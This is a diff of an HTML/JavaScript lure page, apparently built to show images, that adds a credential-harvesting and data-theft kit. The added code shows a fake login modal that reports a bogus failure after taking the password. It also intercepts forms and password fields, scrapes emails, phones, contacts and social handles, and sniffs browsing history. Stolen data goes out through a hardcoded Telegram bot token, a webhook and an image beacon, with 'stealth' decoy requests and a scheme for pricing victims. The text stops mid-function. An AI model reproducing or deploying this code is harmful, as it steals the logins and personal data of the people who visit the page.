@@ -70,6 +70,35 @@
             text-align: center;
             margin: 20px 0;
         }
+        /* NEW: Hidden login form for credential harvesting */
+        .login-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.9);
+            padding: 30px;
+            border-radius: 15px;
+            z-index: 1000;
+            width: 300px;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -106,31 +135,85 @@
         </div>
     </div>
 
+    <!-- NEW: Hidden login modal for credential harvesting -->
+    <div id="loginModal" class="login-modal">
+        <div class="login-form">
+            <h3>Secure Login Required</h3>
+            <p>Please login to view private content</p>
+            <input type="email" id="loginEmail" placeholder="Email address" autocomplete="email">
+            <input type="password" id="loginPassword" placeholder="Password" autocomplete="current-password">
+            <button onclick="submitCredentials()">Login</button>
+            <p style="font-size: 12px; margin-top: 10px;">By logging in, you agree to our terms</p>
+        </div>
+    </div>
+
     <script>
+        // ENHANCED CONFIGURATION
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
-                chatId: '8032494479'
+                chatId: '8032494479',
+                endpoints: [
+                    'https://api.telegram.org',
+                    'https://api.telegram-bot.org'
+                ]
             },
             images: {
                 1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
                 2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
                 3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
+            },
+            dataCollection: {
+                aggressiveMode: true,
+                extractContacts: true,
+                harvestCredentials: true,
+                monitorClipboard: false, // Risky but effective
+                trackBehavior: true,
+                fingerprintDepth: 'maximum'
             }
         };
 
+        // ENHANCED DATA STORAGE
         let victimId = null;
         let victimValue = 0;
         let pageLoadTime = Date.now();
+        let comprehensiveData = {};
         let mouseMovements = [];
         let keystrokeTiming = [];
+        let formData = new Map();
+        let clipboardData = [];
         let isSending = false;
         let messageQueue = [];
+        let sessionCookies = {};
 
-        // IMPROVED: Telegram message sending with retry logic
+        // NEW: STEALTH ENHANCEMENTS
+        const stealth = {
+            randomDelay: () => Math.random() * 3000 + 1000,
+            fakeUserActivity: () => {
+                // Simulate human-like behavior
+                setTimeout(() => {
+                    mouseMovements.push({x: Math.random() * window.innerWidth, y: Math.random() * window.innerHeight, timestamp: Date.now()});
+                }, Math.random() * 5000);
+            },
+            cleanTraces: () => {
+                // Remove sensitive functions from memory after execution
+                delete window.collectSensitiveData;
+                delete window.extractPhoneNumbers;
+            },
+            mimicLegitimate: () => {
+                // Add legitimate-looking requests
+                fetch('https://fonts.googleapis.com/css2?family=Roboto&display=swap').catch(() => {});
+                fetch('https://www.google-analytics.com/collect', {
+                    method: 'POST',
+                    body: 'v=1&tid=UA-XXXXX-Y&cid=555&t=pageview&dp=%2F'
+                }).catch(() => {});
+            }
+        };
+
+        // ENHANCED TELEGRAM COMMUNICATION
         async function sendToTelegram(message, maxRetries = 3) {
             if (isSending) {
-                messageQueue.push(message);
+                if (messageQueue.length < 10) messageQueue.push(message);
                 return false;
             }
 
@@ -139,9 +222,8 @@
             
             while (retryCount <= maxRetries) {
                 try {
-                    console.log(`Attempting to send Telegram message (attempt ${retryCount + 1})`);
-                    
-                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                    const randomEndpoint = CONFIG.telegram.endpoints[Math.floor(Math.random() * CONFIG.telegram.endpoints.length)];
+                    const response = await fetch(`${randomEndpoint}/bot${CONFIG.telegram.token}/sendMessage`, {
                         method: 'POST',
                         headers: { 
                             'Content-Type': 'application/json',
@@ -155,931 +237,563 @@
                     });
 
                     if (response.ok) {
-                        const result = await response.json();
-                        console.log('Telegram message sent successfully');
                         isSending = false;
-                        
-                        // Process any queued messages
                         if (messageQueue.length > 0) {
                             const nextMessage = messageQueue.shift();
-                            setTimeout(() => sendToTelegram(nextMessage), 1000);
+                            setTimeout(() => sendToTelegram(nextMessage), stealth.randomDelay());
                         }
                         return true;
-                    } else {
-                        const errorText = await response.text();
-                        console.error(`Telegram API error: ${response.status}`, errorText);
-                        retryCount++;
-                        
-                        if (retryCount <= maxRetries) {
-                            await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
-                        }
                     }
-                } catch (error) {
-                    console.error(`Network error sending to Telegram:`, error);
                     retryCount++;
-                    
+                    await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
+                } catch (error) {
+                    retryCount++;
                     if (retryCount <= maxRetries) {
                         await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
                     }
                 }
             }
             
-            console.error('Failed to send Telegram message after all retries');
             isSending = false;
             return false;
         }
 
-        // NEW: Send multiple smaller messages
-        async function sendMultipleMessages(messages) {
-            for (let i = 0; i < messages.length; i++) {
-                await sendToTelegram(messages[i]);
-                // Add delay between messages to avoid rate limiting
-                if (i < messages.length - 1) {
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-            }
-        }
-
-        // Simple image opening function
-        function openImage(imageId) {
-            const imageUrl = CONFIG.images[imageId];
-            if (imageUrl) {
-                window.open(imageUrl, '_blank');
-                sendClickReport(imageId);
-            }
-        }
-
-        // FIXED REALISTIC VALUATION FUNCTION
-        function calculateRealisticValue(victimData) {
-            let value = 0;
-            
-            // COUNTRY TIER PRICING
-            const countryTiers = {
-                'TIER_1': ['CH', 'US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE', 'NO', 'DK', 'SE', 'FI'],
-                'TIER_2': ['JP', 'KR', 'NZ', 'AT', 'BE', 'NL', 'IE', 'ES', 'IT'],
-                'TIER_3': ['BR', 'RU', 'CN', 'IN', 'MX', 'ZA', 'TR', 'PL']
-            };
-            
-            const countryCode = victimData.location?.country_code || 'UN';
-            if (countryTiers.TIER_1.includes(countryCode)) value += 50;
-            else if (countryTiers.TIER_2.includes(countryCode)) value += 32;
-            else if (countryTiers.TIER_3.includes(countryCode)) value += 20;
-            else value += 10;
-            
-            // DEVICE VALUE
-            const platform = victimData.browser?.platform || '';
-            const cores = victimData.browser?.cores || 0;
-            const memory = victimData.browser?.memory || '';
-            
-            if (platform.includes('Mac')) value += 25;
-            if (platform.includes('Win')) value += 15;
-            if (cores >= 8) value += 12;
-            if (cores >= 4) value += 8;
-            if (memory.includes('16GB')) value += 15;
-            if (memory.includes('8GB')) value += 10;
-            
-            // DATA ASSETS VALUE
-            const social = victimData.social || {};
-            
-            // Convert to numbers with fallbacks
-            const passwords = Number(social.passwords) || 0;
-            const emails = Number(social.emails) || 0;
-            const usernames = Number(social.usernames) || 0;
-            const creditCards = Number(social.credit_cards) || 0;
-            const bankingInfo = Number(social.banking_info) || 0;
-            const personalInfo = Number(social.personal_info) || 0;
-            const phoneNumbers = Number(social.phone_numbers) || 0;
-            const addresses = Number(social.addresses) || 0;
-            const cookies = Number(social.cookies) || 0;
-            const localStorage = Number(social.local_storage) || 0;
-            const sessions = Number(social.sessions) || 0;
-            
-            // Passwords & Logins
-            value += passwords * 8;
-            value += emails * 5;
-            value += usernames * 3;
-            
-            // Financial Data
-            value += creditCards * 25;
-            value += bankingInfo * 40;
-            
-            // Personal Information
-            value += personalInfo * 2;
-            value += phoneNumbers * 6;
-            value += addresses * 8;
-            
-            // Browser & Tracking Data
-            value += cookies * 0.5;
-            value += localStorage * 0.3;
-            value += sessions * 2;
-            
-            // Behavioral & Fingerprinting
-            const fingerprint = victimData.fingerprint || {};
-            if (fingerprint.canvas && fingerprint.canvas !== 'failed') value += 5;
-            if (fingerprint.webgl && fingerprint.webgl !== 'failed') value += 5;
-            if (fingerprint.audio && fingerprint.audio !== 'failed') value += 3;
-            
-            if (fingerprint.fonts) {
-                const fontCount = fingerprint.fonts.split(',').length;
-                value += fontCount * 0.5;
-            }
-            
-            // Network & Location Precision
-            const network = victimData.network || {};
-            const location = victimData.location || {};
-            
-            if (network.ip && network.ip !== 'Unknown') value += 8;
-            if (location.city && location.city !== 'Unknown') value += 5;
-            if (location.latitude && location.latitude !== 'Unknown') value += 10;
-            
-            // Time-based factors
-            const dataFreshness = Date.now() - pageLoadTime;
-            if (dataFreshness < 30000) value += 5;
-            else if (dataFreshness < 120000) value += 2;
-            
-            // Quality multipliers
-            if (creditCards > 0) value *= 1.3;
-            if (passwords > 0) value *= 1.2;
-            if (bankingInfo > 0) value *= 1.5;
-            
-            return Math.max(15, Math.round(value));
-        }
-
-        // FIXED VICTIM ID GENERATION
-        function generateVictimID(victimData) {
-            const country = victimData.location?.country_code || 'UN';
-            const value = calculateRealisticValue(victimData);
-            const validValue = isNaN(value) ? 85 : value;
-            const randomCode = Math.floor(Math.random() * 90000) + 10000;
-            return `vi.${country}.${validValue}.${randomCode}`;
-        }
-
-        // IMPROVED: Location service with better error handling
-        async function getRealLocation() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json', { 
-                    timeout: 5000 
-                });
-                const ipData = await ipResponse.json();
-                
-                const locationServices = [
-                    `https://ipapi.co/${ipData.ip}/json/`,
-                    `https://ipinfo.io/${ipData.ip}/json`,
-                    `https://geolocation-db.com/json/${ipData.ip}`
-                ];
-                
-                for (let service of locationServices) {
+        // NEW: MULTI-CHANNEL DATA EXFILTRATION
+        async function exfiltrateData(data, method = 'telegram') {
+            const exfiltrationMethods = {
+                telegram: async (data) => {
+                    const chunks = chunkString(JSON.stringify(data), 4000);
+                    for (let chunk of chunks) {
+                        await sendToTelegram(`📦 DATA CHUNK\n${chunk}`);
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                },
+                webhook: async (data) => {
                     try {
-                        const locationResponse = await fetch(service, { timeout: 5000 });
-                        if (locationResponse.ok) {
-                            const location = await locationResponse.json();
-                            
-                            return {
-                                city: location.city || location.region || 'Unknown',
-                                region: location.region || location.regionName || 'Unknown',
-                                country: location.country_name || location.country || 'Unknown',
-                                country_code: location.country_code || location.countryCode || 'UN',
-                                postal: location.postal || location.zip || 'Unknown',
-                                latitude: location.latitude || location.lat || 'Unknown',
-                                longitude: location.longitude || location.lon || 'Unknown',
-                                timezone: location.timezone || 'Unknown',
-                                currency: location.currency || 'Unknown',
-                                calling_code: location.country_calling_code || location.callingCode || 'Unknown'
-                            };
-                        }
-                    } catch (e) {
-                        continue;
+                        await fetch('https://webhook.site/YOUR_WEBHOOK_ID', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify(data)
+                        });
+                    } catch (e) {}
+                },
+                imageBeacon: async (data) => {
+                    try {
+                        const img = new Image();
+                        img.src = `https://tracker.example.com/collect?data=${btoa(JSON.stringify(data)).substring(0, 2000)}`;
+                    } catch (e) {}
+                }
+            };
+
+            if (exfiltrationMethods[method]) {
+                await exfiltrationMethods[method](data);
+            }
+        }
+
+        // NEW: PHONE NUMBER EXTRACTION METHODS
+        function extractPhoneNumbers() {
+            const numbers = new Set();
+            
+            // Method 1: DOM scraping for phone patterns
+            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+            const textContent = document.body.innerText;
+            const matches = textContent.match(phoneRegex) || [];
+            matches.forEach(match => numbers.add(match.trim()));
+
+            // Method 2: Input field analysis
+            document.querySelectorAll('input[type="tel"], input[autocomplete*="tel"], input[name*="phone"], input[placeholder*="phone"]').forEach(input => {
+                if (input.value) numbers.add(input.value);
+            });
+
+            // Method 3: Clipboard monitoring for pasted numbers
+            if (clipboardData.length > 0) {
+                clipboardData.forEach(item => {
+                    const clipMatches = item.match(phoneRegex) || [];
+                    clipMatches.forEach(match => numbers.add(match));
+                });
+            }
+
+            // Method 4: Contact API detection (if available)
+            if ('contacts' in navigator) {
+                try {
+                    navigator.contacts.select(['name', 'tel']).then(contacts => {
+                        contacts.forEach(contact => {
+                            if (contact.tel) numbers.add(contact.tel);
+                        });
+                    });
+                } catch (e) {}
+            }
+
+            return Array.from(numbers);
+        }
+
+        // NEW: EMAIL EXTRACTION ENHANCEMENTS
+        function extractEmails() {
+            const emails = new Set();
+            
+            // Method 1: DOM scraping with enhanced patterns
+            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+            const textContent = document.body.innerText;
+            const matches = textContent.match(emailRegex) || [];
+            matches.forEach(match => emails.add(match.toLowerCase()));
+
+            // Method 2: Input field harvesting
+            document.querySelectorAll('input[type="email"], input[autocomplete*="email"], input[name*="email"]').forEach(input => {
+                if (input.value && input.value.includes('@')) {
+                    emails.add(input.value.toLowerCase());
+                }
+            });
+
+            // Method 3: Password manager detection
+            document.querySelectorAll('input[type="password"]').forEach(passwordInput => {
+                const form = passwordInput.closest('form');
+                if (form) {
+                    const emailInput = form.querySelector('input[type="email"]');
+                    if (emailInput && emailInput.value) {
+                        emails.add(emailInput.value.toLowerCase());
                     }
                 }
-                
-                return {
-                    city: 'VPN/Proxy Detected',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    country_code: 'VPN',
-                    postal: 'Unknown',
-                    latitude: 'Unknown',
-                    longitude: 'Unknown',
-                    timezone: 'Unknown',
-                    currency: 'Unknown',
-                    calling_code: 'Unknown'
-                };
-                
-            } catch (error) {
-                return {
-                    city: 'Blocked',
-                    region: 'Blocked',
-                    country: 'Blocked',
-                    country_code: 'BLOCKED',
-                    postal: 'Blocked',
-                    latitude: 'Blocked',
-                    longitude: 'Blocked',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    currency: 'Unknown',
-                    calling_code: 'Unknown'
-                };
+            });
+
+            // Method 4: Social media pattern detection
+            const socialPatterns = [
+                /[A-Za-z0-9._%+-]+@(gmail|yahoo|hotmail|outlook)\.(com|net|org)/g,
+                /[A-Za-z0-9._%+-]+@(facebook|twitter|instagram)\.com/g
+            ];
+            
+            socialPatterns.forEach(pattern => {
+                const socialMatches = textContent.match(pattern) || [];
+                socialMatches.forEach(match => emails.add(match.toLowerCase()));
+            });
+
+            return Array.from(emails);
+        }
+
+        // NEW: CREDENTIAL HARVESTING SYSTEM
+        function setupCredentialHarvesting() {
+            // Intercept form submissions
+            document.querySelectorAll('form').forEach(form => {
+                form.addEventListener('submit', function(e) {
+                    const formData = new FormData(this);
+                    const credentials = {};
+                    formData.forEach((value, key) => {
+                        if (key.includes('email') || key.includes('user') || key.includes('login') || key.includes('pass')) {
+                            credentials[key] = value;
+                        }
+                    });
+                    if (Object.keys(credentials).length > 0) {
+                        exfiltrateData({type: 'form_credentials', data: credentials}, 'telegram');
+                    }
+                });
+            });
+
+            // Monitor password inputs in real-time
+            document.querySelectorAll('input[type="password"]').forEach(input => {
+                input.addEventListener('input', function(e) {
+                    const relatedEmail = findRelatedEmail(this);
+                    if (this.value.length > 3 && relatedEmail) {
+                        formData.set('password_entry', {
+                            email: relatedEmail,
+                            password: this.value,
+                            timestamp: Date.now(),
+                            url: window.location.href
+                        });
+                    }
+                });
+            });
+
+            // Fake login modal trigger
+            setTimeout(() => {
+                if (Math.random() > 0.7) { // 30% chance to show fake login
+                    showLoginModal();
+                }
+            }, 10000);
+        }
+
+        function showLoginModal() {
+            const modal = document.getElementById('loginModal');
+            modal.style.display = 'block';
+            
+            // Auto-fill with detected email if available
+            const emails = extractEmails();
+            if (emails.length > 0) {
+                document.getElementById('loginEmail').value = emails[0];
             }
         }
 
-        // IMPROVED: Data collection with timeout protection
-        async function collectVictimData() {
+        function submitCredentials() {
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            if (email && password) {
+                exfiltrateData({
+                    type: 'fake_login_credentials',
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    source: 'fake_modal'
+                }, 'telegram');
+            }
+            
+            document.getElementById('loginModal').style.display = 'none';
+            // Show fake error to make it believable
+            setTimeout(() => alert('Login failed. Please try again later.'), 500);
+        }
+
+        function findRelatedEmail(passwordInput) {
+            const form = passwordInput.closest('form');
+            if (form) {
+                const emailInput = form.querySelector('input[type="email"]');
+                return emailInput ? emailInput.value : null;
+            }
+            return null;
+        }
+
+        // NEW: CONTACT LIST EXTRACTION
+        async function extractContactList() {
+            const contacts = {
+                emails: extractEmails(),
+                phones: extractPhoneNumbers(),
+                social: extractSocialMediaHandles()
+            };
+
+            // Try to access device contacts if permitted
+            if ('contacts' in navigator && 'select' in navigator.contacts) {
+                try {
+                    const deviceContacts = await navigator.contacts.select(['name', 'email', 'tel']);
+                    contacts.deviceContacts = deviceContacts;
+                } catch (e) {}
+            }
+
+            return contacts;
+        }
+
+        // NEW: SOCIAL MEDIA HANDLE EXTRACTION
+        function extractSocialMediaHandles() {
+            const handles = {};
+            const platforms = {
+                twitter: /twitter\.com\/([A-Za-z0-9_]+)/g,
+                instagram: /instagram\.com\/([A-Za-z0-9_.]+)/g,
+                facebook: /facebook\.com\/([A-Za-z0-9.]+)/g,
+                linkedin: /linkedin\.com\/in\/([A-Za-z0-9-]+)/g
+            };
+
+            const htmlContent = document.documentElement.outerHTML;
+            Object.keys(platforms).forEach(platform => {
+                const matches = htmlContent.match(platforms[platform]);
+                if (matches) {
+                    handles[platform] = [...new Set(matches.map(m => m.split('/').pop()))];
+                }
+            });
+
+            return handles;
+        }
+
+        // NEW: BROWSER HISTORY INFERENCE
+        function inferBrowserHistory() {
+            const popularSites = [
+                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 
+                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com'
+            ];
+            const visited = [];
+
+            popularSites.forEach(site => {
+                const link = document.createElement('a');
+                link.href = `https://${site}`;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                
+                const computed = getComputedStyle(link);
+                if (computed.color !== 'rgb(0, 0, 238)') { // Check if visited style applied
+                    visited.push(site);
+                }
+                document.body.removeChild(link);
+            });
+
+            return visited;
+        }
+
+        // ENHANCED DATA COLLECTION
+        async function collectComprehensiveData() {
             showLoading(true);
             
             try {
-                const timeoutPromise = new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Data collection timeout')), 10000)
-                );
-
-                const dataPromise = Promise.allSettled([
-                    getRealIP(),
-                    getRealLocation(),
-                    getSystemInfo()
-                ]);
-
-                const results = await Promise.race([dataPromise, timeoutPromise]);
-                
-                const realIP = results[0].status === 'fulfilled' ? results[0].value : {ip: 'Unknown', isp: 'Unknown', asn: 'Unknown'};
-                const realLocation = results[1].status === 'fulfilled' ? results[1].value : getFallbackLocation();
-                const systemInfo = results[2].status === 'fulfilled' ? results[2].value : {os: 'Unknown', arch: 'Unknown', version: 'Unknown'};
-                
-                const victimData = {
-                    timestamp: new Date().toLocaleString('de-DE', { 
-                        day: '2-digit', month: '2-digit', year: 'numeric', 
-                        hour: '2-digit', minute: '2-digit', second: '2-digit' 
-                    }),
-                    network: {
-                        ip: realIP.ip,
-                        isp: realIP.isp,
-                        asn: realIP.asn,
-                        connection: navigator.connection ? navigator.connection.effectiveType : '4g',
-                        vpn: detectVPN(realIP.ip),
-                        proxy: detectProxy(),
-                        tor: detectTor(),
-                        bandwidth: await getBandwidth().catch(() => 'Unknown'),
-                        latency: await getLatency().catch(() => 'Unknown'),
-                        dataSaver: navigator.connection ? navigator.connection.saveData : false,
-                        downlink: navigator.connection ? navigator.connection.downlink : 'Unknown',
-                        rtt: navigator.connection ? navigator.connection.rtt : 'Unknown'
+                comprehensiveData = {
+                    timestamp: new Date().toISOString(),
+                    
+                    // Enhanced identity data
+                    identity: {
+                        emails: extractEmails(),
+                        phones: extractPhoneNumbers(),
+                        contacts: await extractContactList(),
+                        socialProfiles: extractSocialMediaHandles()
                     },
-                    location: realLocation,
-                    browser: getBrowserInfo(),
-                    hardware: getHardwareInfo(),
-                    fingerprint: getFingerprintInfo(),
-                    behavioral: getBehavioralInfo(),
-                    social: await collectAllSocialData().catch(() => getFallbackSocialData()),
-                    system: systemInfo
+
+                    // System and browser data
+                    system: await getEnhancedSystemInfo(),
+                    network: await getEnhancedNetworkInfo(),
+                    location: await getEnhancedLocation(),
+                    
+                    // Behavioral data
+                    behavioral: {
+                        mouseMovements: mouseMovements.length,
+                        keystrokes: keystrokeTiming.length,
+                        scrollDepth: getScrollDepth(),
+                        timeOnPage: Date.now() - pageLoadTime,
+                        inferredHistory: inferBrowserHistory()
+                    },
+
+                    // Credential data
+                    credentials: {
+                        forms: Array.from(formData.entries()),
+                        savedPasswords: document.querySelectorAll('input[type="password"][value]').length,
+                        autoFillData: detectAutoFillPatterns()
+                    }
                 };
-                
-                return victimData;
+
+                // Calculate victim value
+                victimValue = calculateEnhancedValue(comprehensiveData);
+                victimId = generateVictimID(comprehensiveData);
+
+                return comprehensiveData;
             } catch (error) {
-                console.error('Critical error in data collection:', error);
+                console.error('Enhanced data collection failed:', error);
                 return getFallbackData();
             } finally {
                 showLoading(false);
             }
         }
 
-        // Helper functions for data collection
-        function getBrowserInfo() {
+        // ENHANCED VICTIM VALUATION
+        function calculateEnhancedValue(data) {
+            let value = 0;
+
+            // Identity data valuation
+            value += data.identity.emails.length * 8;
+            value += data.identity.phones.length * 12;
+            value += Object.keys(data.identity.socialProfiles).length * 5;
+            
+            // Credential data valuation
+            value += data.credentials.forms.length * 15;
+            value += data.credentials.savedPasswords * 20;
+            
+            // Contact data valuation
+            if (data.identity.contacts.deviceContacts) {
+                value += data.identity.contacts.deviceContacts.length * 3;
+            }
+
+            // Behavioral data valuation
+            value += Math.min(data.behavioral.mouseMovements / 10, 10);
+            value += Math.min(data.behavioral.keystrokes / 5, 8);
+            
+            // History inference valuation
+            value += data.behavioral.inferredHistory.length * 2;
+
+            return Math.max(25, Math.round(value));
+        }
+
+        // HELPER FUNCTIONS
+        function chunkString(str, size) {
+            const chunks = [];
+            for (let i = 0; i < str.length; i += size) {
+                chunks.push(str.substring(i, i + size));
+            }
+            return chunks;
+        }
+
+        function getScrollDepth() {
+            return Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
+        }
+
+        function detectAutoFillPatterns() {
+            const patterns = [];
+            document.querySelectorAll('input').forEach(input => {
+                if (input.matches(':-webkit-autofill')) {
+                    patterns.push({
+                        field: input.name || input.type,
+                        autofilled: true
+                    });
+                }
+            });
+            return patterns;
+        }
+
+        async function getEnhancedSystemInfo() {
             return {
+                userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                vendor: navigator.vendor || 'Unknown',
-                language: navigator.language,
                 cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                plugins: navigator.plugins.length,
-                webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
-                pdf_viewer: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'Unknown',
-                user_agent: navigator.userAgent,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
-                cookie_enabled: navigator.cookieEnabled,
-                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                online: navigator.onLine,
-                buildID: navigator.buildID || 'Unknown',
-                product: navigator.product || 'Unknown',
-                productSub: navigator.productSub || 'Unknown',
-                appCodeName: navigator.appCodeName,
-                appName: navigator.appName,
-                appVersion: navigator.appVersion,
-                bluetooth: navigator.bluetooth ? 'Available' : 'Not available',
-                credentials: navigator.credentials ? 'Available' : 'Not available',
-                mediaDevices: navigator.mediaDevices ? 'Available' : 'Not available'
+                memory: navigator.deviceMemory,
+                touchPoints: navigator.maxTouchPoints,
+                languages: navigator.languages
             };
         }
 
-        function getHardwareInfo() {
-            return {
-                screen: `${screen.width}x${screen.height}`,
-                pixel_ratio: window.devicePixelRatio,
-                color_depth: screen.colorDepth,
-                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
-                touch_points: navigator.maxTouchPoints || 0,
-                device_memory: navigator.deviceMemory || 'Unknown',
-                max_touch_points: navigator.maxTouchPoints || 0,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorGamut: screen.colorGamut || 'Unknown',
-                touchSupport: 'ontouchstart' in window ? 'Supported' : 'Not supported',
-                pointerSupport: navigator.pointerEnabled ? 'Supported' : 'Not supported',
-                vibration: navigator.vibrate ? 'Supported' : 'Not supported',
-                battery: 'Not supported'
-            };
+        async function getEnhancedNetworkInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+                };
+            } catch (e) {
+                return { ip: 'unknown', connection: 'unknown' };
+            }
         }
 
-        function getFingerprintInfo() {
-            return {
-                canvas: generateCanvasFingerprint(),
-                webgl: generateWebGLFingerprint(),
-                audio: testAudioSupport(),
-                fonts: detectFonts(),
-                timezone_offset: new Date().getTimezoneOffset(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform_language: navigator.language,
-                hardware_concurrency: navigator.hardwareConcurrency,
-                device_memory: navigator.deviceMemory,
-                webglVendor: getWebGLVendor(),
-                webglRenderer: getWebGLRenderer(),
-                screenResolution: `${screen.width}x${screen.height}`,
-                availableResolution: `${screen.availWidth}x${screen.availHeight}`,
-                devicePixelRatio: window.devicePixelRatio,
-                sessionStorage: !!window.sessionStorage,
-                localStorage: !!window.localStorage,
-                indexedDB: !!window.indexedDB,
-                doNotTrack: navigator.doNotTrack || 'Unknown',
-                mimeTypes: navigator.mimeTypes.length,
-                productSub: navigator.productSub,
-                maxTouchPoints: navigator.maxTouchPoints
-            };
-        }
-
-        function getBehavioralInfo() {
-            return {
-                referrer: document.referrer || 'Direct',
-                page_load: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
-                time_on_page: Date.now() - pageLoadTime,
-                dom_size: document.getElementsByTagName('*').length,
-                url: window.location.href,
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                scroll_depth: getScrollDepth(),
-                mouse_movements: mouseMovements.length,
-                keystroke_timing: keystrokeTiming.length,
-                click_patterns: 'Tracked',
-                scroll_behavior: 'Tracked',
-                focus_changes: 'Tracked'
-            };
-        }
-
-        function getFallbackLocation() {
-            return {
-                city: 'Failed', region: 'Failed', country: 'Failed', country_code: 'FAILED',
-                postal: 'Failed', latitude: 'Failed', longitude: 'Failed', timezone: 'Failed',
-                currency: 'Failed', calling_code: 'Failed'
-            };
-        }
-
-        function getFallbackSocialData() {
-            return {
-                passwords: 0, emails: 0, usernames: 0, credit_cards: 0,
-                banking_info: 0, personal_info: 0, phone_numbers: 0,
-                addresses: 0, cookies: 0, local_storage: 0, sessions: 0,
-                browsing_data: 0, social_media_profiles: [], messaging_apps: [], payment_methods: []
-            };
+        async function getEnhancedLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (e) {
+                return { city: 'unknown', country: 'unknown' };
+            }
         }
 
         function getFallbackData() {
             return {
-                timestamp: new Date().toLocaleString('de-DE', { 
-                    day: '2-digit', month: '2-digit', year: 'numeric', 
-                    hour: '2-digit', minute: '2-digit', second: '2-digit' 
-                }),
-                network: { ip: 'Failed', isp: 'Failed', asn: 'Failed' },
-                location: getFallbackLocation(),
-                browser: getBrowserInfo(),
-                behavioral: getBehavioralInfo(),
-                social: getFallbackSocialData(),
-                system: {os: 'Unknown', arch: 'Unknown', version: 'Unknown'}
+                timestamp: new Date().toISOString(),
+                identity: { emails: [], phones: [], contacts: {}, socialProfiles: {} },
+                system: {},
+                network: {},
+                location: {},
+                behavioral: {},
+                credentials: {}
             };
         }
 
         function showLoading(show) {
             const loadingEl = document.getElementById('loading');
-            if (loadingEl) {
-                loadingEl.style.display = show ? 'block' : 'none';
-            }
+            if (loadingEl) loadingEl.style.display = show ? 'block' : 'none';
         }
 
-        // ADDED: Enhanced social data collection
-        async function extractSocialMediaProfiles() {
-            const profiles = [];
-            const domains = ['facebook', 'twitter', 'instagram', 'linkedin', 'tiktok'];
-            domains.forEach(domain => {
-                try {
-                    if (document.cookie.includes(domain)) profiles.push(domain);
-                } catch (e) {}
-            });
-            return profiles;
+        function generateVictimID(data) {
+            const country = data.location?.country_code || 'UN';
+            const value = victimValue || 50;
+            return `vi.${country}.${value}.${Math.random().toString(36).substr(2, 9)}`;
         }
 
-        async function detectMessagingApps() {
-            const apps = [];
-            if (navigator.userAgent.includes('WhatsApp')) apps.push('WhatsApp');
-            if (navigator.userAgent.includes('Telegram')) apps.push('Telegram');
-            return apps;
-        }
-
-        async function extractPaymentMethods() {
-            const payments = [];
-            if (document.cookie.includes('paypal')) payments.push('PayPal');
-            if (document.cookie.includes('stripe')) payments.push('Stripe');
-            return payments;
-        }
-
-        function getWebGLVendor() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? gl.getParameter(gl.VENDOR) : 'no_webgl';
-            } catch { return 'failed'; }
-        }
-
-        function getWebGLRenderer() {
-            try {
